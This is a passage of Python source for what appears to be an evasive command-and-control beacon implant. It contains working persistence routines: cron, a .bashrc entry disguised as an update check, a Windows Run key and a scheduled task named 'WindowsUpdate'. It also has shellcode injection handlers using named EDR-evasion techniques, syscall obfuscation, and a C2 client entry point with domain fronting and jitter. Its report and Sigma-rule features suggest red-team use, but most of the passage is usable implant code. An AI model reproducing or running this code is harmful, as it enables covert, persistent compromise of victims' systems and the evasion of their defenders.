            'detected_edr': None,
        }
        
        if self.persistence_god:
            # Get current state from persistence god
            result['chains_installed'] = self.persistence_god.get_installed_chains()
            result['ai_recommendation'] = self.persistence_god.get_ai_recommendation()
            result['detected_edr'] = self.persistence_god.detected_edr
        
        return result
    
    def _persist_cron(self) -> str:
        """Linux cron persistence"""
        beacon_path = os.path.abspath(__file__)
        cron_entry = f"*/5 * * * * /usr/bin/python3 {beacon_path}\n"
        
        # Add to crontab
        os.system(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')
        return "Cron persistence established"
    
    def _persist_bashrc(self) -> str:
        """Linux bashrc persistence"""
        beacon_path = os.path.abspath(__file__)
        bashrc = os.path.expanduser("~/.bashrc")
        
        entry = f"\n# System update check\nnohup /usr/bin/python3 {beacon_path} &>/dev/null &\n"
        
        with open(bashrc, 'a') as f:
            f.write(entry)
        
        return "Bashrc persistence established"
    
    def _persist_registry(self) -> str:
        """Windows registry persistence"""
        import winreg
        beacon_path = os.path.abspath(__file__)
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ,
                          f"pythonw.exe {beacon_path}")
        winreg.CloseKey(key)
        
        return "Registry persistence established"
    
    def _persist_schtasks(self) -> str:
        """Windows scheduled task persistence"""
        beacon_path = os.path.abspath(__file__)
        
        cmd = (
            f'schtasks /create /tn "WindowsUpdate" /tr "pythonw.exe {beacon_path}" '
            '/sc onlogon /rl highest /f'
        )
        subprocess.run(cmd, shell=True, capture_output=True)
        
        return "Scheduled task persistence established"
    
    def _handle_migrate(self, task: Dict) -> str:
        """Process migration with injection masterclass (Windows only)"""
        target_pid = task.get('pid')
        target_name = task.get('process')
        shellcode = task.get('shellcode')
        
        if not self.injection_engine:
            return "Migration failed: Injection engine not available"
        
        if not target_pid and not target_name:
            return "Migration failed: No target PID or process name specified"
        
        try:
            # If no shellcode provided, generate beacon shellcode
            if not shellcode:
                # Would generate beacon shellcode here
                return "Migration requires shellcode - use inject task with shellcode"
            
            # Decode shellcode if base64
            if isinstance(shellcode, str):
                import base64
                shellcode = base64.b64decode(shellcode)
            
            # Perform injection
            result = self.injection_engine.inject(
                shellcode=shellcode,
                pid=target_pid,
                technique=None  # AI selects
            )
            
            if result.success:
                return f"Migration successful: {result.technique.value} -> PID {result.target_pid} ({result.target_name})"
            else:
                return f"Migration failed: {result.error}"
                
        except Exception as e:
            return f"Migration error: {e}"
    
    def _handle_inject(self, task: Dict) -> str:
        """Inject shellcode using masterclass engine"""
        shellcode_b64 = task.get('shellcode')
        target_pid = task.get('pid')
        technique = task.get('technique')
        
        if not self.injection_engine:
            return "Injection failed: Injection engine not available"
        
        if not shellcode_b64:
            return "Injection failed: No shellcode provided"
        
        try:
            # Decode shellcode
            import base64
            shellcode = base64.b64decode(shellcode_b64)
            
            # Parse technique if specified
            inject_technique = None
            if technique and technique != "ai_select":
                technique_map = {
                    'ghosting': InjectionTechnique.PROCESS_GHOSTING,
                    'herpaderping': InjectionTechnique.PROCESS_HERPADERPING,
                    'early_bird': InjectionTechnique.EARLY_BIRD_APC,
                    'module_stomping': InjectionTechnique.MODULE_STOMPING,
                    'syscall': InjectionTechnique.SYSCALL_INJECTION,
                    'classic_crt': InjectionTechnique.CLASSIC_CRT,
                }
                inject_technique = technique_map.get(technique.lower())
            
            # Perform injection
            result = self.injection_engine.inject(
                shellcode=shellcode,
                pid=target_pid,
                technique=inject_technique
            )
            
            # Build response
            if result.success:
                response = {
                    "status": "success",
                    "technique": result.technique.value,
                    "target_pid": result.target_pid,
                    "target_name": result.target_name,
                    "thread_id": result.thread_id,
                    "ppid_spoofed": result.ppid_spoofed,
                    "mutations_applied": len(result.mutations_applied),
                    "artifacts_wiped": len(result.artifacts_wiped),
                    "evasion_score": result.evasion_score,
                    "phantom_process": result.phantom_process,
                    "fallback_used": result.fallback_used,
                }
                return json.dumps(response)
            else:
                return f"Injection failed: {result.error} (tried: {result.chain_attempts})"
                
        except Exception as e:
            return f"Injection error: {e}"
    
    def get_injection_status(self) -> Dict[str, Any]:
        """Get injection engine status"""
        if not self.injection_engine:
            return {"available": False, "reason": "Engine not initialized"}
        
        # Get AI recommendation
        selector = AIInjectionSelector()
        technique, profile = selector.detect_and_select()
        
        return {
            "available": True,
            "detected_edr": profile.get('profile', {}).get('name', 'None'),
            "primary_technique": technique.value,
            "ppid_spoof_enabled": self.config.enable_ppid_spoof,
            "mutation_enabled": self.config.enable_mutation,
            "artifact_wipe_enabled": self.config.enable_artifact_wipe,
        }
    
    # =========================================================================
    # SYSCALL OBFUSCATION
    # =========================================================================
    
    def obfuscate_syscall(
        self,
        syscall_name: str,
        args: Dict[str, Any] = None,
        use_full_monster: bool = True
    ) -> Dict[str, Any]:
        """
        Obfuscate a syscall using the monster engine.
        
        Args:
            syscall_name: Name of syscall (e.g., "NtAllocateVirtualMemory")
            args: Syscall arguments
            use_full_monster: Apply full monster obfuscation
        
        Returns:
            Dict with obfuscation result
        """
        if not self.syscall_obfuscator:
            return {
                "success": False,
                "error": "Syscall obfuscator not available",
                "syscall": syscall_name
            }
        
        try:
            result = self.syscall_obfuscator.obfuscate_call(
                syscall_name=syscall_name,
                args=args or {}
            )
            return {
                "success": True,
                "syscall": syscall_name,
                "layers_applied": result.get("layers_applied", []),
                "ssn": result.get("ssn"),
                "stub_hash": result.get("stub_hash"),
                "entropy": result.get("entropy"),
                "mutation_generation": result.get("mutation_generation"),
                "spoofed_calls": result.get("spoof_results", []),
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "syscall": syscall_name
            }
    
    def obfuscate_syscall_sequence(
        self,
        syscalls: List[str],
        args_list: List[Dict] = None,
        reseed_after: int = 3
    ) -> List[Dict[str, Any]]:
        """
        Obfuscate a sequence of syscalls with reseed between.
        
        Args:
            syscalls: List of syscall names
            args_list: List of args for each syscall
            reseed_after: Reseed mutation engine after N calls
        
        Returns:
            List of obfuscation results
        """
        if not self.syscall_obfuscator:
            return [{"success": False, "error": "Obfuscator not available"}]
        
        results = []
        args_list = args_list or [{}] * len(syscalls)
        
        for idx, (syscall, args) in enumerate(zip(syscalls, args_list)):
            result = self.obfuscate_syscall(syscall, args)
            results.append(result)
            
            # Reseed after N calls
            if (idx + 1) % reseed_after == 0:
                if hasattr(self.syscall_obfuscator, 'reseed_mutation'):
                    self.syscall_obfuscator.reseed_mutation()
        
        return results
    
    def get_syscall_obfuscator_status(self) -> Dict[str, Any]:
        """Get syscall obfuscator status"""
        if not self.syscall_obfuscator:
            return {"available": False, "reason": "Engine not initialized"}
        
        # Get AI recommendation
        try:
            selector = AIObfuscationSelector()
            layer, profile = selector.detect_and_select()
            
            return {
                "available": True,
                "detected_edr": profile.get('profile', {}).get('name', 'None'),
                "recommended_layer": layer.value,
                "ml_mutation_enabled": self.config.syscall_use_ml,
                "mutation_rate": self.config.syscall_mutation_rate,
                "fresh_ssn_enabled": self.config.syscall_use_fresh_ssn,
                "spoof_enabled": self.config.syscall_enable_spoof,
                "junk_ratio": self.config.syscall_junk_ratio,
            }
        except Exception as e:
            return {
                "available": True,
                "error": str(e),
            }
    
    def _handle_report(self, task: Dict) -> Dict:
        """
        Generate chain execution report.
        
        Task params:
            format: Output format (html, pdf, json, markdown, all)
            output_dir: Output directory
            anonymize: Anonymize sensitive data
            include_sigma: Include Sigma rules
            include_mitre: Include MITRE mapping
            style: AI summary style (executive, technical, twitter)
        """
        result = {
            "success": False,
            "report_path": "",
            "html_path": "",
            "pdf_path": "",
            "sigma_rules": [],
            "mitre_coverage": {},
            "ai_summary": "",
            "twitter_thread": [],
            "error": None,
        }
        
        if not REPORT_GENERATOR_AVAILABLE or not self.report_generator:
            result["error"] = "Report generator not available"
            return result
        
        try:
            # Get params
            params = task.get("params", {})
            format_str = params.get("format", self.config.report_format)
            output_dir = params.get("output_dir", self.config.report_output_dir)
            anonymize = params.get("anonymize", self.config.report_anonymize)
            include_sigma = params.get("include_sigma", self.config.report_include_sigma)
            include_mitre = params.get("include_mitre", self.config.report_include_mitre)
            style = params.get("style", "executive")
            
            # Build chain log from state
            chain_log = self._build_chain_log()
            
            # Generate report
            report_result = self.report_generator.generate_report(chain_log, output_dir)
            
            # Copy results
            result["success"] = report_result.success
            result["report_path"] = report_result.report_path
            result["html_path"] = report_result.html_path
            result["pdf_path"] = report_result.pdf_path
            result["ai_summary"] = report_result.ai_summary
            result["twitter_thread"] = report_result.twitter_thread
            
            # Convert sigma rules to YAML
            result["sigma_rules"] = [r.to_yaml() for r in report_result.sigma_rules]
            
            # Convert mitre coverage
            result["mitre_coverage"] = {
                k: {
                    "technique_id": v.technique_id,
                    "technique_name": v.technique_name,
                    "tactic": v.tactic.name,
                    "success_count": v.success_count,
                    "evasion_score": v.evasion_score,
                }
                for k, v in report_result.mitre_coverage.items()
            }
            
            if report_result.error:
                result["error"] = report_result.error
            
            # Log report generation
            self._log_chain_entry(
                technique="report_generation",
                tactic="documentation",
                success=result["success"],
                edr_bypass=1.0,
                details={"format": format_str, "path": result["report_path"]},
            )
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _build_chain_log(self) -> "ChainLog":
        """Build ChainLog from beacon state"""
        if not REPORT_GENERATOR_AVAILABLE:
            return None
        
        entries = []
        for entry_dict in self.state.chain_log_entries:
            entries.append(ChainLogEntry(**entry_dict))
        
        return ChainLog(
            chain_id=self.config.beacon_id,
            start_time=datetime.now(),
            entries=entries,
            target_host=platform.node(),
            operator="beacon",
            notes="Auto-generated from beacon chain execution",
        )
    
    def _log_chain_entry(
        self,
        technique: str,
        tactic: str,
        success: bool,
        edr_bypass: float,
        target_host: str = None,
        target_user: str = None,
        details: Dict = None,
    ):
        """Log chain execution entry for reporting"""
        entry = {
            "timestamp": datetime.now(),
            "technique": technique,
            "tactic": tactic,
            "success": success,
            "edr_bypass_rate": edr_bypass,
            "target_host": target_host or platform.node(),
            "target_user": target_user,
            "artifacts": [],
            "detection_details": {},
            "notes": "",
        }
        if details:
            entry["detection_details"] = details
        
        self.state.chain_log_entries.append(entry)
    
    def generate_report_on_exit(self) -> Dict:
        """Generate final report when beacon exits (if auto_report enabled)"""
        if not self.config.report_auto_generate:
            return {"skipped": True, "reason": "Auto-report disabled"}
        
        return self._handle_report({"params": {}})
    
    def _handle_exit(self, task: Dict) -> str:
        """Stop beacon and optionally generate report"""
        # Auto-generate report if enabled
        if self.config.report_auto_generate:
            print("[*] Generating final chain report...")
            report_result = self.generate_report_on_exit()
            if report_result.get("success"):
                print(f"[+] Report generated: {report_result.get('report_path')}")
            elif report_result.get("error"):
                print(f"[!] Report generation failed: {report_result.get('error')}")
        
        self.state.is_running = False
        return "Beacon exiting"


def main():
    """Main entry point"""
    # Default configuration - would be embedded during payload generation
    config = BeaconConfig(
        c2_host="127.0.0.1",
        c2_port=8080,
        sleep_time=60,
        jitter_percent=30,
        evasion_level=3
    )
    
    # Parse command line overrides
    import argparse
    parser = argparse.ArgumentParser(description="Evasive Beacon Agent")
    parser.add_argument("--host", default=config.c2_host, help="C2 host")
    parser.add_argument("--port", type=int, default=config.c2_port, help="C2 port")
    parser.add_argument("--sleep", type=int, default=config.sleep_time, help="Sleep time")
    parser.add_argument("--jitter", type=int, default=config.jitter_percent, help="Jitter %")
    parser.add_argument("--evasion", type=int, default=config.evasion_level, 
                        choices=[0,1,2,3], help="Evasion level (0-3)")
    parser.add_argument("--proxy", default=None, help="Proxy URL")
    parser.add_argument("--front", default=None, help="Domain fronting host")
    
    args = parser.parse_args()
    
    config.c2_host = args.host
    config.c2_port = args.port
    config.sleep_time = args.sleep
    config.jitter_percent = args.jitter
    config.evasion_level = args.evasion
    config.proxy = args.proxy
    config.domain_front_host = args.front
    
    # Create and run beacon
    beacon = EvasiveBeacon(config)
    beacon.run()


if __name__ == "__main__":
    main()
